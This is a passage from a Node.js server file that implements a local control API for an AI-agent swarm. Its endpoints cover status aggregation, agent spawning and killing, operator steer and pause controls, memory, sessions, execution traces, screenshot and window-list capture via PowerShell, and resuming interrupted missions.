      const get = (url, fb) => new Promise(resolve => { require('http').get(url, { timeout:2500 }, res => { let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{resolve(JSON.parse(d));}catch{resolve(fb);}});}).on('error',()=>resolve(fb)).on('timeout',()=>resolve(fb)); }).catch(()=>fb);
      const compact = (v,max=120) => { const c=String(v||'').replace(/\s+/g,' ').trim(); return c.length>max?c.slice(0,max)+'...':c; };
      const readKernel = (lim=20) => { try { const {getApiHarnessKernel}=require('./lib/api-harness-kernel.js'); const sc=require('./swarm_coordinator.js'); return getApiHarnessKernel({rootDir:process.cwd(),swarmCoordinator:sc}).listJobs(lim); } catch { return[]; } };
      const readScores = () => { try { const p=path.join(PURP_DIR,'agent_score.json'); return fs.existsSync(p)?JSON.parse(fs.readFileSync(p,'utf8')):{meta:{totalTasksRecorded:0},agents:{},intents:{},history:[]}; } catch { return{meta:{totalTasksRecorded:0},agents:{},intents:{},history:[]}; } };
      const readLlmLedger = () => { try { const p=path.join(PURP_DIR,'agent_work','llm-ledger.jsonl'); if(!fs.existsSync(p))return{totalCalls:0,totalTokens:0,totalCost:0}; const lines=fs.readFileSync(p,'utf8').trim().split('\n').filter(Boolean); return lines.reduce((s,l)=>{try{const e=JSON.parse(l);s.totalCalls++;s.totalTokens+=e.total_tokens||0;s.totalCost+=e.estimatedCost||0;}catch{}return s;},{totalCalls:0,totalTokens:0,totalCost:0}); } catch { return{totalCalls:0,totalTokens:0,totalCost:0}; } };
      try {
        const [apiHealth,apiControl,tower,bus,pipeline,omnicode,delegation,llmStatus,researchStatus] = await Promise.all([
          get('http://127.0.0.1:7780/api/health',{status:'unavailable'}),
          get('http://127.0.0.1:7780/api/status',{status:'unavailable'}),
          get('http://127.0.0.1:7790/tower/status',{activeAgents:[],registeredAgents:[],teams:[]}),
          get('http://127.0.0.1:7782/state',{recentEvents:[]}),
          get('http://127.0.0.1:7784/api/pipeline',null),
          get('http://127.0.0.1:7780/api/omnicode/status',null),
          get('http://127.0.0.1:7780/api/delegation/status',null),
          get('http://127.0.0.1:7780/api/llm/status',null),
          get('http://127.0.0.1:7780/api/research/status',null),
        ]);
        const kernelJobs = readKernel(20);
        const agentScores = readScores();
        const llmLedger = readLlmLedger();
        const compactJob = (j) => ({ id:j.id, goal:compact(j.goal,240), state:j.state, route:j.route, mode:j.mode, dryRun:j.dryRun, createdAt:j.createdAt, startedAt:j.startedAt, finishedAt:j.finishedAt, durationMs:j.durationMs, error:compact(j.error,260) });
        return sendJson(res, 200, {
          api:{ ...apiControl, ...apiHealth, controlStatus:apiControl?.status||'unavailable', healthStatus:apiHealth?.status||'unavailable', status:apiHealth?.status==='healthy'?'healthy':(apiControl?.status||apiHealth?.status||'unavailable'), bridgeConnected:Boolean(apiHealth?.bridgeConnected??apiControl?.bridgeConnected) },
          tower, eventBus:{recentEvents:(bus.recentEvents||[]).slice(-25)},
          pipeline, kernelJobs:Array.isArray(kernelJobs)?kernelJobs.map(compactJob):[],
          omnicodeStatus:omnicode, delegationStatus:delegation, llmStatus,
          agentScores:{meta:agentScores.meta||{totalTasksRecorded:0},agentCount:Object.keys(agentScores.agents||{}).length,intentCount:Object.keys(agentScores.intents||{}).length,recent:(agentScores.history||[]).slice(-20).reverse().map((r)=>({agent:compact(r.agent,40),intent:compact(r.intent,80),success:Boolean(r.success),duration:r.duration||0,timestamp:r.timestamp}))},
          llmLedger,
        });
      } catch(e) { return sendJson(res, 500, { error:e.message }); }
    }

    if (pathname === '/api/command' && method === 'POST') {
      const body = await parseBody(req);
      if (!body.text) return sendJson(res, 400, { error: 'text required' });
      state.lastCommand = { text: body.text, timestamp: new Date().toISOString() };
      sendToBridge({ type: 'user_command', text: body.text });
      state.sammyStatus = 'working';
      state.logs.unshift({ timestamp: new Date().toISOString(), type: 'command_sent', data: { command: body.text } });
      if (state.logs.length > state.maxLogs) state.logs.pop();
      broadcast({ type: 'command_sent', command: body.text, timestamp: new Date().toISOString() });
      return sendJson(res, 200, { ok: true, command: state.lastCommand });
    }

    // ── Breakdown: full-stack census (tools/skills/agents/providers/memory/services) ──
    if (pathname === '/api/breakdown' && method === 'GET') {
      try {
        const { whoamiFull } = require('./lib/whoami');
        const w = await whoamiFull();
        const llmMod = require('./lib/llm-provider.js');
        const allProviders = llmMod.PROVIDERS ? Object.keys(llmMod.PROVIDERS) : [];
        const configured = Array.isArray(w.systems.providers.present) ? w.systems.providers.present : [];
        const toolsBreakdown = w.systems.tools.breakdown || {};
        const toolsTotal = w.systems.tools.total || 0;
        let memoryLayers = { scratch: 'unknown', episodic: 'unknown', procedural: 'unknown',
                             vector: 'unknown', temporal: 'unknown', counterfactual: 'unknown', semantic: 'unknown' };
        try {
          const shim = require('./lib/spine-shim');
          await new Promise(res => shim.getCachedStats((err, s) => {
            if (s && s.atoms) {
              memoryLayers.vector = s.atoms > 0 ? 'wired' : 'empty';
              memoryLayers.semantic = s.atoms > 100 ? 'wired' : 'partial';
            }
            res();
          }));
        } catch {}
        // Any HTTP answer (even 404) = port live; only refusal/timeout = down.
        const probe = async (port, healthPath) => {
          try {
            await fetch(`http://127.0.0.1:${port}${healthPath || '/health'}`, { signal: AbortSignal.timeout(800) });
            return true;
          } catch { return false; }
        };
        const services = {};
        const svcPorts = [['unified_api',7780,'/api/health'],['eventbus',7782,'/state'],
                          ['orchestrator',7784,'/api/pipeline'],['agent_tower',7790,'/tower/status'],
                          ['gatekeeper',7791,'/health'],['memory_matrix',7880,'/health'],
                          ['cognitive_spine',7880,'/health'],['swarm_coord',7898,'/health']];
        for (const [name, port] of svcPorts) {
          if (!(name in services)) services[name] = { port, online: false };
        }
        await Promise.all(svcPorts.map(async ([name, port, healthPath]) => {
          services[name].online = await probe(port, healthPath);
        }));
        return sendJson(res, 200, {
          generatedAt: new Date().toISOString(),
          tools: {
            total: toolsTotal,
            breakdown: {
              core:        toolsBreakdown.core || 0,
              skills:      toolsBreakdown.skills || 0,
              mcp:         toolsBreakdown.mcp || 0,
              bodyBridge:  toolsBreakdown.bodyBridge || 0,
              nim:         toolsBreakdown.nim || 0,
            },
          },
          skills: { count: w.systems.skills.count || 0 },
          agents: {
            registered: w.systems.agents.count || 0,
            divisions:  w.surfaces.agentTower.divisions || 0,
            active:     w.surfaces.agentTower.active || 0,
          },
          providers: {
            registered:  allProviders.length,
            configured:  configured.length,
            list:        allProviders,
            configuredList: configured,
          },
          memory: { layers: memoryLayers, status: 'see /api/spine/health for live stats' },
          services,
          routes: { total: w.systems.routes.total || 0 },
          api: w.surfaces.unifiedApi,
          tower: w.surfaces.agentTower,
        });
      } catch (e) { return sendJson(res, 500, { ok: false, error: e.message }); }
    }

    if (pathname === '/api/response' && method === 'POST') {
      const body = await parseBody(req);
      const entry = { text: body.text, timestamp: new Date().toISOString(), type: body.type || 'response' };
      state.responses.unshift(entry);
      if (state.responses.length > 50) state.responses.pop();
      state.sammyStatus = 'ready';
      state.logs.unshift({ timestamp: new Date().toISOString(), type: 'sammy_response', data: entry });
      if (state.logs.length > state.maxLogs) state.logs.pop();
      broadcast({ type: 'sammy_response', response: entry });
      return sendJson(res, 200, { ok: true });
    }

    if (pathname === '/api/responses' && method === 'GET') { const limit = parseInt(parsedUrl.query.limit || '20'); return sendJson(res, 200, state.responses.slice(0, limit)); }

    if (pathname === '/api/division/control' && method === 'POST') {
      const body = await parseBody(req);
      const { division, action, value } = body;
      if (action === 'boost') { spawnDivisionAgent(division, `Division boost: ${division}`); }
      else if (action === 'throttle') { const agents = Object.values(state.swarmAgents).filter(a => a.division === division && a.status === 'working'); if (agents.length > 0) killAgent(agents[0].id); }
      const event = { type: 'division_control', action, division, value, timestamp: new Date().toISOString() };
      sendToBridge(event);
      broadcast(event);
      if (!state.divisions) state.divisions = {};
      if (!state.divisions[division]) state.divisions[division] = {};
      state.divisions[division][action] = { value, timestamp: new Date().toISOString() };
      const divisionSwarmAgents = Object.values(state.swarmAgents).filter(a => a.division === division);
      const workingAgents = divisionSwarmAgents.filter(a => a.status === 'working');
      return sendJson(res, 200, { ok: true, event, divisionAgents: { count: divisionSwarmAgents.length, active: workingAgents.length } });
    }

    if (pathname === '/api/reallocate' && method === 'POST') {
      const body = await parseBody(req);
      const { from, to, count } = body;
      const sourceAgents = Object.values(state.swarmAgents).filter(a => a.division === from && a.status === 'working');
      const agentsToMove = sourceAgents.slice(0, Math.min(count, sourceAgents.length));
      agentsToMove.forEach(agent => killAgent(agent.id));
      for (let i = 0; i < agentsToMove.length; i++) spawnDivisionAgent(to, `Reallocated from ${from} to ${to}`);
      const event = { type: 'reallocate', from, to, count: agentsToMove.length, timestamp: new Date().toISOString() };
      sendToBridge(event);
      broadcast(event);
      return sendJson(res, 200, { ok: true, event, moved: agentsToMove.length });
    }

    if (pathname === '/api/divisions' && method === 'GET') {
      const divisionState = {};
      const allDivisions = ['AI Research', 'Media Ops', 'Security', 'Data Mining', 'Engineering', 'Design', 'Management', 'Infrastructure', 'Lobby'];
      for (const division of allDivisions) {
        const divisionSwarmAgents = Object.values(state.swarmAgents).filter(a => a.division === division);
        const workingAgents = divisionSwarmAgents.filter(a => a.status === 'working');
        divisionState[division] = { count: divisionSwarmAgents.length, active: workingAgents.length, priority: 3, activeAgents: workingAgents.length, agents: workingAgents.map(a => ({ id: a.id, name: a.name || null, status: a.status, currentTask: a.currentTask, startTime: a.startTime })) };
      }
      return sendJson(res, 200, divisionState);
    }

    if (pathname === '/api/gesture' && method === 'POST') {
      const body = await parseBody(req);
      const { gesture, value } = body;
      let action = null;
      if (gesture === 'rotate') action = { type: 'cycle_divisions', direction: value > 0 ? 'next' : 'prev' };
      else if (gesture === 'tap') action = { type: 'select_division' };
      else if (gesture === 'hold_rotate') action = { type: 'adjust_agents', amount: value };
      else if (gesture === 'double_tap') action = { type: 'execute_command' };
      else if (gesture === 'hold') action = { type: 'voice_override' };
      const event = { type: 'gesture', gesture, value, action, timestamp: new Date().toISOString() };
      sendToBridge(event);
      broadcast(event);
      return sendJson(res, 200, { ok: true, event, action });
    }

    if (pathname === '/api/ball/broadcast' && method === 'POST') {
      const body = await parseBody(req);
      try {
        const client = net.createConnection(7778, '127.0.0.1');
        client.write(JSON.stringify({ type: 'display', message: body.message, division: body.division, agents: body.agents, timestamp: new Date().toISOString() }) + '\n');
        client.end();
      } catch (e) {}
      broadcast({ type: 'ball_broadcast', message: body.message, timestamp: new Date().toISOString() });
      return sendJson(res, 200, { ok: true });
    }

    if (pathname === '/api/lcd/monitor' && method === 'POST') {
      const body = await parseBody(req);
      const action = body.action || 'status';
      try {
        const client = net.createConnection(7778, '127.0.0.1');
        client.write(JSON.stringify({ type: 'monitor_logs', action }) + '\n');
        let response = '';
        client.on('data', d => response += d.toString());
        client.on('end', () => { try { broadcast({ type: 'lcd_monitor', action }); } catch (e) {} client.destroy(); });
        client.on('error', () => {});
        setTimeout(() => { try { client.destroy(); } catch (e) {} sendJson(res, 200, { ok: true, action }); }, 500);
      } catch (e) { sendJson(res, 200, { ok: true, action, error: e.message }); }
    }

    if (pathname === '/api/interrupt' && method === 'POST') {
      const body = await parseBody(req);
      const event = { type: 'interrupt', agentId: body.agentId, signal: body.signal, timestamp: new Date().toISOString() };
      sendToBridge(event);
      broadcast(event);
      return sendJson(res, 200, { ok: true, event });
    }

    // ── SPEC-004 priority-steer control surface ─────────────────────────────
    // The operator's live hold on an executing mission. Same module instance
    // agent-loop consumes at its turn boundaries, so what these endpoints
    // change is what the loop actually obeys — no second steering system.
    //   steer  → inject into the CURRENT run at its next safe point
    //   queue  → ride the next turn boundary (normal priority follow-up)
    //   pause  → abandon the current turn gracefully; mission state is kept
    //   remove / clear → edit and delete queued directives
    if (pathname === '/api/steer' && method === 'GET') {
      const PSTEER_API = (() => { try { return require('./lib/priority-steer'); } catch { return null; } })();
      if (!PSTEER_API) return sendJson(res, 503, { ok: false, error: 'priority-steer unavailable' });
      return sendJson(res, 200, { ok: true, status: PSTEER_API.steerStatus() });
    }
    if (pathname === '/api/steer' && method === 'POST') {
      const PSTEER_API = (() => { try { return require('./lib/priority-steer'); } catch { return null; } })();
      if (!PSTEER_API) return sendJson(res, 503, { ok: false, error: 'priority-steer unavailable' });
      const body = await parseBody(req);
      const directive = String(body.directive || '').trim();
      const context = { sessionId: body.session_id || body.sessionId || null, surface: body.source || 'cockpit' };
      try {
        if (body.action === 'steer' && directive) {
          // Queue the directive AND interrupt the current turn so it runs at the
          // NEXT safe point instead of waiting for the current turn to finish.
          const interruption = PSTEER_API.interrupt('operator steer — abandoning current turn');
          const item = PSTEER_API.queueNext(directive, { priority: 'high', tags: ['steer'], context });
          return sendJson(res, 200, { ok: true, action: 'steer', item, interruption, status: PSTEER_API.steerStatus() });
        }
        if (body.action === 'queue' && directive) {
          const item = PSTEER_API.queueNext(directive, { priority: 'normal', tags: ['followup'], context });
          return sendJson(res, 200, { ok: true, action: 'queue', item, status: PSTEER_API.steerStatus() });
        }
        if (body.action === 'pause') {
          const interruption = PSTEER_API.interrupt(String(body.reason || 'operator pause'));
          return sendJson(res, 200, { ok: true, action: 'pause', interruption, status: PSTEER_API.steerStatus() });
        }
        if (body.action === 'resume') {
          // Release a pending pause that no run has consumed yet. Without this
          // a pause clicked in the last second of a run sits armed and would
          // assassinate whichever mission runs next.
          const clearedReason = PSTEER_API.clearInterrupt();
          return sendJson(res, 200, { ok: true, action: 'resume', clearedReason, status: PSTEER_API.steerStatus() });
        }
        if (body.action === 'remove' && body.id) {
          const removed = PSTEER_API.removeFromQueue(body.id);
          return sendJson(res, 200, { ok: true, action: 'remove', removed, status: PSTEER_API.steerStatus() });
        }
        if (body.action === 'clear') {
          const cleared = PSTEER_API.clearQueue();
          return sendJson(res, 200, { ok: true, action: 'clear', cleared, status: PSTEER_API.steerStatus() });
        }
        return sendJson(res, 400, { ok: false, error: 'unknown steer action (steer|queue|pause|resume|remove|clear)' });
      } catch (e) {
        return sendJson(res, 409, { ok: false, error: e.message, status: PSTEER_API.steerStatus() });
      }
    }

    if (pathname === '/api/memory' && method === 'GET') {
      let memory = { facts: [], notes: [] };
      try { if (fs.existsSync(MEMORY_FILE)) memory = JSON.parse(fs.readFileSync(MEMORY_FILE, 'utf8')); } catch (e) {}
      return sendJson(res, 200, memory);
    }

    if (pathname === '/api/memory' && method === 'POST') {
      const body = await parseBody(req);
      let memory = { facts: [], notes: [] };
      try { if (fs.existsSync(MEMORY_FILE)) memory = JSON.parse(fs.readFileSync(MEMORY_FILE, 'utf8')); } catch (e) {}
      if (body.fact) memory.facts.push({ content: body.fact, timestamp: new Date().toISOString() });
      if (body.note) memory.notes.push({ content: body.note, timestamp: new Date().toISOString() });
      fs.writeFileSync(MEMORY_FILE, JSON.stringify(memory, null, 2));
      return sendJson(res, 200, { ok: true, memory });
    }

    if (pathname === '/api/roster' && method === 'GET') {
      // Canonical roster view — the one source every surface (CLI/TUI/Web/Mobile)
      // reads for agents + skills. Live projections, no per-surface copies.
      try {
        const agents = require('./lib/agent-registry').listAgents();
        const skillDirs = fs.readdirSync(SKILLS_DIR, { withFileTypes: true })
          .filter(e => e.isDirectory() && !e.name.startsWith('.'))
          .filter(e => fs.existsSync(path.join(SKILLS_DIR, e.name, 'SKILL.md')));
        return sendJson(res, 200, {
          agents: agents.map(a => ({
            key: a.key, name: a.name, division: a.division || null,
            role: a.role || null, model: a.model || null,
            emoji: a.emoji || null, tier: a.tier ?? null, skills: a.skills || []
          })),
          skills: skillDirs.map(e => ({ key: e.name })),
          counts: { agents: agents.length, skills: skillDirs.length }
        });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/skills' && method === 'GET') {
      const skills = {};
      try {
        const files = fs.readdirSync(SKILLS_DIR).filter(f => f.endsWith('.js'));
        for (const file of files) skills[file.replace('.js', '')] = { file, loaded: !!loadedSkills[file.replace('.js', '')] };
      } catch (e) {}
      return sendJson(res, 200, skills);
    }

    if (pathname.startsWith('/api/skills/') && pathname.endsWith('/reload') && method === 'POST') {
      const skillName = pathname.split('/')[3];
      sendToBridge({ type: 'reload_skill', skill: skillName });
      return sendJson(res, 200, { ok: true, skill: skillName });
    }

    if (pathname === '/api/tasks' && method === 'GET') return sendJson(res, 200, state.tasks);
    if (pathname === '/api/tasks' && method === 'DELETE') { state.tasks = {}; sendToBridge({ type: 'cancel_all_tasks' }); return sendJson(res, 200, { ok: true }); }

    if (pathname === '/api/swarm' && method === 'GET') {
      const swarmData = Object.values(state.swarmAgents).map(agent => ({ ...agent, processInfo: state.activeProcesses[agent.pid] ? { running: true, startTime: state.activeProcesses[agent.pid].startTime } : { running: false } }));
      return sendJson(res, 200, swarmData);
    }

    if (pathname === '/api/swarm/spawn' && method === 'POST') {
      const body = await parseBody(req);
      const division = body.division || 'Lobby';
      const task = body.task || 'General task';
      const agentName = body.agentName || null;
      const agentId = spawnDivisionAgent(division, task, agentName);
      if (agentId) return sendJson(res, 200, { ok: true, agentId, division, task, agentName });
      else return sendJson(res, 500, { error: 'Failed to spawn agent' });
    }

    if (pathname.startsWith('/api/swarm/') && pathname.endsWith('/kill') && method === 'POST') {
      const agentId = pathname.split('/')[3];
      const success = killAgent(agentId);
      return sendJson(res, 200, { ok: success, agentId });
    }

    if (pathname === '/api/swarm/events' && method === 'POST') {
      const body = await parseBody(req);
      const { event_type, agent_data, source } = body;
      console.log(`[CONTROL API] Swarm event from ${source}: ${event_type}`, agent_data?.id?.substring(0, 8));
      if (agent_data && agent_data.id) state.swarmAgents[agent_data.id] = { ...agent_data, source: source || 'kimmi_integration', lastUpdate: new Date().toISOString() };
      broadcast({ type: 'swarm_event', event_type, agent_data, source, timestamp: new Date().toISOString() });
      return sendJson(res, 200, { ok: true, received: event_type });
    }

    if (pathname === '/api/settings' && method === 'GET') return sendJson(res, 200, publicSettings(state.settings));
    if (pathname === '/api/settings' && method === 'POST') { const body = await parseBody(req); Object.assign(state.settings, body); saveSettings(); return sendJson(res, 200, { ok: true, settings: publicSettings(state.settings) }); }

    // Canonical Core-owned conversations. All browser brands, CLI/TUI and the
    // desktop shell read the same repository; no surface-local chat database.
    if (pathname === '/api/sessions' && method === 'GET') {
      const limit = Number(new URL(req.url, 'http://127.0.0.1').searchParams.get('limit') || 50);
      return sendJson(res, 200, { ok: true, sessions: SESSION_REPOSITORY.listSessions(limit) });
    }
    if (pathname === '/api/sessions' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const session = SESSION_REPOSITORY.createSession(body.title, body.provider, body.model, {
          id: body.id,
          source: body.source || 'api',
          profile: body.profile,
        });
        return sendJson(res, 201, { ok: true, session });
      } catch (e) { return sendJson(res, 400, { error: e.message }); }
    }
    const sessionMatch = pathname.match(/^\/api\/sessions\/([^/]+)$/);
    if (sessionMatch && method === 'GET') {
      const session = SESSION_REPOSITORY.loadSession(decodeURIComponent(sessionMatch[1]));
      return session ? sendJson(res, 200, { ok: true, session }) : sendJson(res, 404, { error: 'session not found' });
    }
    if (sessionMatch && method === 'DELETE') {
      const sid = decodeURIComponent(sessionMatch[1]);
      traceClear(sid);
      REACHAROUND_STATES.delete(sid);
      return sendJson(res, 200, { ok: true, ...SESSION_REPOSITORY.deleteSession(sid) });
    }

    // ── Execution trace events ───────────────────────────────────────────────
    // POST /api/traces/:sessionId/events  — append one or many events
    // GET  /api/traces/:sessionId/events  — get all events + meta for reload reconstruct
    // DELETE /api/traces/:sessionId      — clear trace (called on newMission)
    const traceMatch = pathname.match(/^\/api\/traces\/([^/]+)(\/events)?$/);
    if (traceMatch) {
      const traceSid = decodeURIComponent(traceMatch[1]);
      if (method === 'GET') {
        const { events, meta } = traceGet(traceSid);
        return sendJson(res, 200, { ok: true, events, meta, count: events.length });
      }
      if (method === 'POST') {
        try {
          const body = await parseBody(req);
          // Accept a single event or an array
          const list = Array.isArray(body) ? body : [body];
          list.forEach(ev => {
            if (ev.runId) traceSetMeta(traceSid, { runId: ev.runId });
            if (ev.type === 'run-start') traceSetMeta(traceSid, { runId: ev.runId, startedAt: ev.timestamp || Date.now(), provider: ev.provider, model: ev.model });
            if (ev.type === 'run-end')  traceSetMeta(traceSid, { endedAt: ev.timestamp || Date.now(), status: ev.status });
            if (ev.provider) traceSetMeta(traceSid, { provider: ev.provider });
            if (ev.model)   traceSetMeta(traceSid, { model: ev.model });
            if (typeof ev.tokens === 'number') traceSetMeta(traceSid, { tokens: ev.tokens });
            traceAppend(traceSid, ev);
          });
          return sendJson(res, 200, { ok: true, appended: list.length });
        } catch (e) { return sendJson(res, 400, { error: e.message }); }
      }
      if (method === 'DELETE') {
        traceClear(traceSid);
        return sendJson(res, 200, { ok: true });
      }
      return sendJson(res, 405, { error: 'method not allowed' });
    }

    // ── Reacharound state — current verdict + progress scores for cockpit display ─
    // GET /api/reacharound/:sessionId  — returns current Reacharound state (or null)
    const raMatch = pathname.match(/^\/api\/reacharound\/([^/]+)$/);
    if (raMatch && method === 'GET') {
      const raSid = decodeURIComponent(raMatch[1]);
      const state = REACHAROUND_STATES.get(raSid) || null;
      return sendJson(res, 200, { ok: true, state });
    }
    // DELETE /api/reacharound/:sessionId — clear on newMission
    if (raMatch && method === 'DELETE') {
      REACHAROUND_STATES.delete(decodeURIComponent(raMatch[1]));
      return sendJson(res, 200, { ok: true });
    }

    // ========== CANONICAL VIEWS (read-only projections) =====================
    // Tools / Memory / Missions pages read these. They own no state — every
    // number is computed live from the tool registry, the permission evaluator
    // and the durable memory layers, so a page cannot drift from the runtime.
    if (pathname === '/api/tools' && method === 'GET') {
      try {
        return sendJson(res, 200, require('./lib/views').tools(require('./lib/tools')));
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/capabilities' && method === 'GET') {
      try { return sendJson(res, 200, await require('./lib/views').capabilities()); }
      catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/machine/discovery' && method === 'GET') {
      try {
        const current = require('./lib/machine-discovery').current();
        return sendJson(res, current.ok ? 200 : 404, current);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // Cockpit ＋ attach surface — real machine context for the composer's
    // attach options. Both are read-only: screen capture writes one temp PNG
    // beside the OS temp dir; window list only reads titles.
    if (pathname === '/api/machine/screenshot' && method === 'GET') {
      try {
        const shot = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$out = Join-Path $env:TEMP ("purpclaw_shot_" + (Get-Date -Format yyyyMMdd_HHmmss) + ".png")
$bmp.Save($out)
$gfx.Dispose(); $bmp.Dispose()
[pscustomobject]@{ path = $out; width = $screen.Width; height = $screen.Height } | ConvertTo-Json -Compress
`, 15000);
        const data = JSON.parse(shot);
        return sendJson(res, 200, { ok: true, path: data.path, width: data.width, height: data.height });
      } catch (e) { return sendJson(res, 200, { ok: false, error: e.message }); }
    }
    if (pathname === '/api/machine/windows' && method === 'GET') {
      try {
        const list = await psScript(`
Add-Type @'
using System;using System.Runtime.InteropServices;
public class FW{ [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); }
'@
$fg = [FW]::GetForegroundWindow()
$rows = Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | ForEach-Object {
  [pscustomobject]@{ name = $_.Name; title = $_.MainWindowTitle; id = $_.Id; focused = ($_.MainWindowHandle -eq $fg) }
}
[pscustomobject]@{ windows = @($rows) } | ConvertTo-Json -Depth 3 -Compress
`, 12000);
        const data = JSON.parse(list);
        const windows = Array.isArray(data.windows) ? data.windows : (data.windows ? [data.windows] : []);
        return sendJson(res, 200, { ok: true, windows, focused: (windows.find(w => w.focused) || {}).title || null });
      } catch (e) { return sendJson(res, 200, { ok: false, error: e.message }); }
    }

    if (pathname === '/api/machine/discovery' && method === 'POST') {
      try {
        const result = await require('./lib/machine-discovery').discover({
          onEvent: (type, payload) => broadcast({ type, ...payload }),
        });
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/instance/state' && method === 'GET') {
      try {
        return sendJson(res, 200, {
          ok: true,
          ...INSTANCE_STATE.manifest(),
          activeMission: INSTANCE_STATE.getActiveMission(),
        });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/runtime/lifecycle' && method === 'GET') {
      try {
        const lifecycle = require('./lib/runtime-lifecycle').getRuntimeLifecycle();
        return sendJson(res, 200, { ok: true, ...lifecycle.status(), parity: lifecycle.parityReport() });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    // Projects: registered folder roots. The composer's workspace menu must
    // read this same list — two sources would drift immediately.
    if (pathname === '/api/projects' && method === 'GET') {
      try { return sendJson(res, 200, require('./lib/projects').list({})); }
      catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/projects' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const P = require('./lib/projects');
        if (body && body.unregister) return sendJson(res, 200, P.unregister(body.unregister));
        if (!body || !body.root) return sendJson(res, 400, { error: 'root required' });
        const r = P.register(body.root, body.meta || {});
        return sendJson(res, r.ok ? 200 : 400, r);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/skills/registry' && method === 'GET') {
      try { return sendJson(res, 200, require('./lib/views').skills(require('./lib/tools'))); }
      catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/memory/vault' && method === 'GET') {
      try {
        const q = new URL(req.url, 'http://x').searchParams;
        return sendJson(res, 200, require('./lib/views').memoryVault({
          query: q.get('q') || '', layer: q.get('layer') || null,
          limit: Math.min(parseInt(q.get('limit') || '50', 10) || 50, 300) }));
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/memory/dejavu' && method === 'GET') {
      try {
        const q = new URL(req.url, 'http://x').searchParams;
        const verified = q.get('verified');
        return sendJson(res, 200, require('./lib/views').dejavuTraces({
          query: q.get('q') || '',
          outcome: q.get('outcome') || null,
          verified: verified === 'true' ? true : verified === 'false' ? false : null,
          limit: Math.min(parseInt(q.get('limit') || '50', 10) || 50, 300),
        }));
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    // Settings → Memory: the engine room. Every field here is read at a real
    // call site in the turn path, so changing it changes behaviour.
    if (pathname === '/api/settings/memory' && (method === 'GET' || method === 'POST')) {
      try {
        const MC = require('./lib/memory-config');
        if (method === 'GET') {
          return sendJson(res, 200, { ok: true, config: MC.load(), layers: MC.ALL_LAYERS, defaults: MC.DEFAULTS });
        }
        const body = await parseBody(req);
        return sendJson(res, 200, { ok: true, config: MC.save(body || {}) });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/missions' && method === 'GET') {
      try { return sendJson(res, 200, require('./lib/views').missions({})); }
      catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    // ── Mission resume (goal-driven law): interrupted missions are durable.
    // GET /api/missions/interrupted  → scan ledger for recovery_pending
    // POST /api/missions/:id/resume  → re-feed goal + step receipts to runAgent
    if (pathname === '/api/missions/interrupted' && method === 'GET') {
      try {
        const M = require('./lib/missions');
        const fromLedger = M.scanInterrupted();
        const inFlight = M.getRecoveryPending();
        const seen = new Set(fromLedger.map(m => m.missionId));
        const merged = [...fromLedger, ...(inFlight && !seen.has(inFlight.missionId) ? [inFlight] : [])];
        return sendJson(res, 200, { ok: true, missions: merged });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    { // POST /api/missions/:id/resume — resume an interrupted mission
      const mResume = pathname.match(/^\/api\/missions\/([^/]+)\/resume$/);
      if (mResume && method === 'POST') {
        try {
          const M = require('./lib/missions');
          const missionId = decodeURIComponent(mResume[1]);
          const rec = (M.list({ limit: 5000 }).missions || []).find(r => r.missionId === missionId)
            || M.getRecoveryPending();
          if (!rec) return sendJson(res, 404, { error: 'mission not found' });
          const body = await parseBody(req).catch(() => ({}));
          if (body && body.dryRun) {
            return sendJson(res, 200, { ok: true, dryRun: true, missionId,
              goal: rec.prompt || null, steps: (rec.toolCalls || []).map(t => ({ tool: t.tool, ok: t.ok })),
              activeAction: rec.activeAction || null });
          }
          const goal = String(rec.prompt || body && body.goal || '').trim();
          if (!goal) return sendJson(res, 400, { error: 'mission has no stored goal to resume' });
          const completed = (rec.toolCalls || []).filter(t => t.ok !== false).map(t =>
            `${t.tool}(${Object.keys(t.args || {}).length} args) → ok`);
          const failed = (rec.toolCalls || []).filter(t => t.ok === false).map(t =>
            `${t.tool} → failed${t.err ? ': ' + String(t.err).slice(0, 120) : ''}`);
          const resumeDirective =
            '[mission-resume] This is a RESUME of an interrupted operation.\n'
            + 'ORIGINAL GOAL: ' + goal.slice(0, 800) + '\n'
            + (completed.length ? 'ALREADY COMPLETED (do not redo unless verification requires it):\n- ' + completed.join('\n- ') + '\n' : '')
            + (failed.length ? 'FAILED / INCOMPLETE:\n- ' + failed.join('\n- ') + '\n' : '')
            + (rec.activeAction ? `WAS IN FLIGHT WHEN INTERRUPTED: ${JSON.stringify(rec.activeAction).slice(0, 300)}\n` : '')
            + 'Continue from the first unfinished step. Do not merely describe what you would do.';
          // Resume runs as a normal agent turn in the same session so receipts
          // and history stay on one lineage.
          const runOpts = { sessionId: rec.sessionId || undefined };
          const { runAgent } = require('./lib/agent-loop');
          const chunks = [];
          for await (const ev of runAgent({ prompt: resumeDirective, ...runOpts })) {
            if (ev.type === 'token' && ev.content) chunks.push(ev.content);
          }
